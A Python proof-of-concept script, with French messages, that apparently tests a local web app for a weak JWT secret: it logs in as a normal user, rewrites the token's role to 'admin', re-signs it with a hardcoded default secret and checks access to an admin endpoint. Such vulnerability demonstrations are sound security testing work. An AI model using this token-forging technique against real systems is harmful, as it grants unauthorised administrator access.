import requests
import json
import base64
import hmac
import hashlib
import sys

BASE_URL = "http://localhost:5000/api"
USERNAME = "lamyae"
PASSWORD = "lamyae1234"
JWT_SECRET = "your_super_secret_jwt_key_change_in_production_2024"

def b64_encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',', ':')).encode()
    ).decode().rstrip('=')

def b64_decode(data):
    data += '=' * (4 - len(data) % 4)
    return json.loads(base64.urlsafe_b64decode(data))

def sign_token(header_b64, payload_b64, secret):
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return base64.urlsafe_b64encode(sig).decode().rstrip('=')

def login_and_get_token():
    print("🔐 Tentative de connexion avec compte normal (lamyae)...")
    r = requests.post(f"{BASE_URL}/auth/login",
        json={"username": USERNAME, "password": PASSWORD})
    if r.status_code != 200:
        print(f"❌ Échec connexion: {r.status_code} {r.text}")
        sys.exit(1)
    token = r.json()["token"]
    print(f"✅ Token reçu: {token}")
    return token

def decode_token(token):
    parts = token.split(".")
    payload = b64_decode(parts[1])
    print(f"📦 Payload original: {json.dumps(payload, indent=2)}")
    return parts[0], parts[1], payload

def forge_admin_token(header_b64, payload):
    print("\n🔨 Forgeage du token avec role='admin'...")
    payload["role"] = "admin"
    new_payload_b64 = b64_encode(payload)
    signature = sign_token(header_b64, new_payload_b64, JWT_SECRET)
    forged = f"{header_b64}.{new_payload_b64}.{signature}"
    # ✅ CORRECTION ICI
    print(f"✅ Token forgé: {forged}")
    return forged

def test_admin(token, label):
    print(f"\n🧪 Test: {label}")
    r = requests.get(f"{BASE_URL}/admin/stats",
        headers={"Authorization": f"Bearer {token}"})
    if r.status_code == 200:
        print(f"✅ ACCÈS ADMIN RÉUSSI — Vulnérabilité confirmée!")
        print(f"   Données: {r.json()}")
        return True
    else:
        print(f"❌ Accès refusé ({r.status_code})")
        return False

def main():
    print("🚀 Démonstration — JWT Secret Faible + Role Tampering\n")

    token = login_and_get_token()
    header_b64, payload_b64, payload = decode_token(token)

    test_admin(token, "Accès admin avec token user normal")

    forged = forge_admin_token(header_b64, payload)
    success = test_admin(forged, "Accès admin avec token forgé (role=admin)")

    print("\n📊 RÉSULTAT:")
    if success:
        print("🔴 VULNÉRABLE: Secret JWT exposé → token forgé accepté!")
        print("   N'importe qui connaissant le secret peut se faire admin.")
    else:
        print("🟢 SÉCURISÉ: Attaque bloquée.")

if __name__ == "__main__":
    main()